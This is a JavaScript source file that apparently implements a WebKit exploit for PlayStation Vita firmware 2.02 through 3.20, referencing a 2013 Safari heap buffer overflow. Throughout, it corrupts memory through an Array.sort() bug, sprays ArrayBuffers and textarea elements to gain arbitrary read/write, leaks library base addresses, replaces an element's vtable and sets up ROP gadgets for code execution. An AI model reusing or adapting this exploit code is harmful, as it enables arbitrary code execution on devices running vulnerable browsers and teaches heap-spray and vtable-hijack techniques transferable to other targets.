/*
    [PSA-2013-0903-1] Apple Safari Heap Buffer Overflow
*/

function initMemoryHole(doROP)
{
    try {
	
		if (doROP)
		{
			// Check Vita version for ROP offsets.
			var user_agent = navigator.userAgent;
			if (user_agent.indexOf("Vita 2.02") != -1) {
				version = "v2_02";
				loadExtra = true;
			} else if (user_agent.indexOf("Vita 2.05") != -1) {
				version = "v2_05";
				loadExtra = true;
			} else if (user_agent.indexOf("Vita 2.12") != -1) {
				version = "v2_12";
				loadExtra = true;
			} else if (user_agent.indexOf("Vita 3.00") != -1) {
				version = "v3_00";
				loadExtra = true;
			} else if(user_agent.indexOf("Vita 3.01") != -1) {
				version = "v3_01";
				loadExtra = true;
			} else if(user_agent.indexOf("Vita 3.15") != -1) {
				version = "v3_15";
				loadExtra = true;
			} else if(user_agent.indexOf("Vita 3.18") != -1) {
				version = "v3_18";
				loadExtra = true;
			} else if(user_agent.indexOf("Vita 3.20") != -1) {
				version = "v3_20";
				loadExtra = true;
			} else {
				logdbg("Not Supported !");
				return -1;
			}
		}
		
        /* 
           .sort() vuln c/p
-------------------------------------------------------------------------------
        */
		
        logdbg("Initialization");
        var u32 = new Uint32Array(8);
        var a1 = [0,1,2,3,u32];
        var a2 = [0,1,2,3,4]; // right after a1
        var a1len = a1.length;
        var a2len = a2.length;
        var u32len = u32.length;

        if (!_gc) _gc = new Array();
        _gc.push(u32,a1,a2);

        var myCompFunc = function(x,y)
        {
            if (y == 3 && x == u32) {
                a1.shift();
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var u32addr = a2.length;
        if (u32addr == a2len) { 
			logAdd("Error: 1"); 
			return -1;
		}

        myCompFunc = function(x,y)
        {
            if (y == 0 && x == 1) {
                a1.length = a1len;
                a1.shift();
                a2.length = u32addr + 0x28;
            }
            if (y == 3) {
                a1.unshift(0);
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var c = a2.length;
        if (c != u32addr + 0x28) { 
			logAdd("Error: 2");
			a1[3] = 0;
			return -1; 
		}

        var mo = {};
        var pd = {
			get: function() {
				return 0;
			}, 
			set: function(arg) {
				return 0;
			}, 
			enumerable: true, 
			configurable:true
		}
        var a3 = [0,1,2,a1[3]];

        Object.defineProperty(mo, "prop0", pd);
        for(var i = 1; i < 7; i++) {
            mo["prop"+i] = i;
        }

        _gc.push(a3,mo,pd);

        myCompFunc = function(x,y)
        {
            if (y == 2) {
                a3.shift();
            }
            return 0;
        }

        a3.sort(myCompFunc);
        a1[3] = 0; a3[3] = 0;

        u32.prop1 = 8;
        u32.prop2 = 8;
        u32.prop3 = 8;
        u32.prop4 = u2d(u32addr, u32addr+0x10);

        var f = new Function(" return 876543210 + " + (_cnt++) + ";");
        f.prop2 = u2d(0x40000000, 0x40000000);
        f();
        pd.get = f;
        Object.defineProperty(mo, "prop0", pd);
        delete mo.prop0;

        if (u32.length == u32len) {
			logAdd("Error: 3"); 
			return -1;
		}
        /*
-------------------------------------------------------------------------------
         */

        /* 
           Spray memory with ArrayBuffers that will be used to get
           arbitrary read/write. 
        */
        var spraysize = 0x1000
        logdbg("Spraying ArrayBuffers...");

        sprays = new Array(spraysize);
        _gc.push(sprays);
        for (var o = 0; o < spraysize; o++) {
            buf = new ArrayBuffer(0xABC0);
            _gc.push(buf);
            sprays[o] = buf;
        }
        logdbg("Done spraying");

        /*
           Find one of the sprayed ArrayBuffer objects in memory
           by looking for the size of the object
        */
        var idx = -1;       // Index in u32 to size of object
        var baseaddr = -1;  // Base address of object
        logdbg("Searching for ArrayBuffer signature...");
        for (var j = 0x0; j < 0xffffffff; j++) {
            if ((j % (0xa0000)) == 0){
                logdbg("...");
            }
            if (u32[j] == 0xABC0) {
                baseaddr = u32[j-1];
                idx = j;
                logdbg("Found ArrayBuffer signature at u32[0x" + idx.toString(16) + "] -> 0x" + baseaddr.toString(16));
                break;
            }
        }
        if (idx == -1) {
            logdbg("Did not find ArrayBuffer signature");
            return -1;
        }
		
		if (doROP)
		{
			/* 
				Spray memory with Element objects
			*/
			var espraysize = 0x2000
			logdbg("Spraying Elements...");

			esprays = new Array(espraysize);
			_gc.push(esprays);

			for (var o = 0; o < espraysize; o++) {
				var e = document.createElement("textarea");
				e.rows = 0x66656463;
				_gc.push(e);
				esprays[o] = e;
			}
		
			logdbg("Done spraying");
		
			/*
				Find one of the sprayed Element objects in memory
				by looking for the rows of the object
			*/
			var eidx = -1;       // Index in u32 to size of object
			logdbg("Searching for Element signature...");
			for (var j = 0x0; j < 0xffffffff; j++) {
				if ((j % (0xa0000)) == 0) {
					logdbg("...");
				}
				if (u32[j] == 0x66656463) {
					eidx = j;
					logdbg("Found Element signature at u32[0x" + eidx.toString(16) + "]");
					break;
				}
			}
			if (eidx == -1) {
				logdbg("Did not find Element signature");
				return -1;
			}

			/*
				Change the rows of the Element object then scan the array of
				sprayed objects to find an object whose rows have been changed

			*/
			var oldval = u32[eidx].toString(16);
			u32[eidx] = 0x55555555;
			logdbg("Changing size of Element object: 0x" + oldval + " -> 0x" + u32[eidx].toString(16));

			logdbg("Looking for modified Element object...");
			var eleobj = -1;
			for (var l = 0; l < espraysize; l++) {
				var t = esprays[l];
				if (t.rows == 0x55555555) {
					eleobj = t;
					logdbg("Found modified Element object at esprays[0x" + l.toString(16) + "]");
				}
			}

			if (eleobj == -1) {
				logdbg("Did not find modified object");
				return -1;
			}
		}
		
        /*
           Change the size of the object then scan the array of
           sprayed objects to find an object whose size has been changed
        */
        var oldval = u32[idx].toString(16);
        u32[idx] = 0xdeadbabe;
        logdbg("Changing size of object: 0x" + oldval + " -> 0x" + u32[idx].toString(16));

        logdbg("Looking for modified object...");
        var arrobj = -1;
        for (var l = 0; l < spraysize; l++) {
            var t = sprays[l];
            if (t.byteLength == 0xdeadbabe) {
                arrobj = t;
                logdbg("Found modified object at sprays[0x" + l.toString(16) + "]");
            }
        }

        if (arrobj == -1) {
            logdbg("Did not find modified object");
            return -1;
        }
		
        // Get base address of u32(ArrayBufferView.m_baseAddress)
        var u32base = u32[0x40000000-2];
        logdbg("Address of u32: 0x" + u32addr.toString(16))
        logdbg("Base of u32: 0x" + u32base.toString(16))
		
		u32[idx - 1] = 0x0;                  // Modify base pointer of ArrayBuffer object
        u32[idx] = 0xffffff00;               // Modify size of ArrayBuffer object
        aspace = new Uint8Array(arrobj);
        aspace32 = new Uint32Array(arrobj);
        aspace16 = new Uint16Array(arrobj);
		
		var vtab = aspace32[(u32addr / 4)];	  				  // Vtable of u32 
        logdbg("Vtab of u32: 0x" + vtab.toString(16));
        leakedptr = aspace32[((vtab + 0x48)/ 4)]; 			  // Leaked pointer from .text of SceWebKit
        logdbg("Leaked ptr: 0x" + leakedptr.toString(16));

		if (doROP)
		{
			allocate_memory = init_memory(u32base - 0x400000);    // Allocate memory for ROP
			
			// Important: These are done here instead of when the scripts are loaded because they allocate
			// heap memory, which greatly increases the chance that the exploit will fail.
			defineLibraryFuncs();
			defineOffsets();
			offsets = ver_offsets[version];

			// Get SceWebKit base         
			scewkbase = leakedptr - offsets.scewkbase_off;
			
			// Get SceLibc base
			var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
			
			// Get SceNet base
			var scenetbase = get_base_from_offsets(scewkbase, offsets.scelibnetentry_off, offsets.scelibnetbase_off);
			
			// Get SceKernel base
			var scekernbase = get_base_from_offsets(scewkbase, offsets.scekernentry_off, offsets.scekernbase_off);
			
			/*
				Create fake vtable and replace old one
			*/
			var vtoffset = offsets.elementvtable_off;
			var scrollvoffset = offsets.setscrollleft_off;
			var vtidx = ((u32base + (eidx * 4) ) + vtoffset); 
			var vtptr = aspace32[vtidx / 4];

			logdbg("Element vtable pointer at: 0x" + vtidx.toString(16));
			logdbg("Element vtable at: 0x" + vtptr.toString(16));

			var fkvtable = allocate_memory(0x400 * 4);
			logdbg("Fake vtable at: 0x" + fkvtable.toString(16));

			logdbg("Copying vtable...\n");
			for (var i = 0; i < 0x400; i++) {
				aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(vtptr + (i << 2)) / 4];
			}

			aspace32[vtidx / 4] = fkvtable;

			/*
				Initialize ROP gadgets and library functions
			*/
			bases = {
						"SceWebKit": scewkbase,
						"SceLibKernel": scekernbase, 
						"SceNet": scenetbase,
						"SceLibc": scelibcbase
			};

			var tmpmem = allocate_memory(0x5000);
			caller = get_caller(tmpmem, eleobj, vtidx, fkvtable, version);
			libraries = init_ggts(bases, caller, version);
			
			// List all modules visible by the WebKit process
			ex_mod_list = list_modules("All", false);
			ex_mod_segments = ex_mod_list[0];
			ex_mod_offsets = ex_mod_list[1];
			ex_mod_sizes = ex_mod_list[2];
			
			// Get SceWebKitProcess base
			var scewkprocbase = ex_mod_offsets["SceWebKitProcess.seg0"];
			
			// Get SceCommonDialog base
			var scecdiagbase = ex_mod_offsets["SceCommonDialog.seg0"];
			
			// Get SceAppUtil base
			var sceapputilbase = ex_mod_offsets["SceAppUtil.seg0"];
			
			// Get SceDriverUser base
			var scedrvusrbase = ex_mod_offsets["SceDriverUser.seg0"];
			
			// Get SceGxm base
			var scegxmbase = ex_mod_offsets["SceGxm.seg0"];
			
			// Reload the libraries with the new modules' base addresses
			ex_bases = {
						"SceWebKitProcess" : scewkprocbase,
						"SceCommonDialog" : scecdiagbase,
						"SceAppUtil" : sceapputilbase,
						"SceDriverUser" : scedrvusrbase,
						"SceGxm" : scegxmbase,
			};
			
			libraries = init_ggts(ex_bases, get_caller(tmpmem, eleobj, vtidx, fkvtable, version), version);
			
			// Load additional modules
			if (loadExtra)
			{
				// Find SceCommonDialog.seg1 address
				var scecdiagseg1 = ex_mod_offsets["SceCommonDialog.seg1"];
			
				// Load SceCommonDialogMain, ScePhotoImportDialogPlugin and ScePaf
				load_scecdiagmain(scecdiagseg1);
				load_scephotoimpdlgplugin();
				load_scepaf();
			
				// List all modules visible by the WebKit process again
				ex_mod_list = list_modules("All", false);
				ex_mod_segments = ex_mod_list[0];
				ex_mod_offsets = ex_mod_list[1];
				ex_mod_sizes = ex_mod_list[2];
			
				// Get ScePaf base
				var scepafbase = ex_mod_offsets["ScePaf.seg0"];
			
				// Get SceCommonDialogMain base
				var scecdiagmain = ex_mod_offsets["SceCommonDialogMain.seg0"];
			
				// Reload the libraries with the new modules' base addresses
				ex_bases = {
							"ScePaf" : scepafbase,
							"SceCommonDialogMain" : scecdiagmain,
				};
			
				libraries = init_ggts(ex_bases, get_caller(tmpmem, eleobj, vtidx, fkvtable, version), version);
			}
			
			// Log base addresses
			logdbg("-------------------------------------------------");
			logdbg("SceWebKit base: 0x" + scewkbase.toString(16));
			logdbg("SceLibc base: 0x" + scelibcbase.toString(16));
			logdbg("SceNet base: 0x" + scenetbase.toString(16));
			logdbg("SceLibKernel base: 0x" + scekernbase.toString(16));
			logdbg("SceWebKitProcess base: 0x" + scewkprocbase.toString(16));
			logdbg("SceCommonDialog base: 0x" + scecdiagbase.toString(16));
			logdbg("SceAppUtil base: 0x" + sceapputilbase.toString(16));
			logdbg("SceDriverUser base: 0x" + scedrvusrbase.toString(16));
			logdbg("SceGxm base: 0x" + scegxmbase.toString(16));
			
			if (loadExtra)
			{
				logdbg("ScePaf base: 0x" + scepafbase.toString(16));
				logdbg("SceCommonDialogMain base: 0x" + scecdiagmain.toString(16));
			}
			
			logdbg("-------------------------------------------------");
			
			logdbg("Exploit completed!\n");
		}

		return aspace;
    }
    catch(e) {
        logdbg("Error: " + e.line + " " + e);
        return -1;
    }

    return -1;
}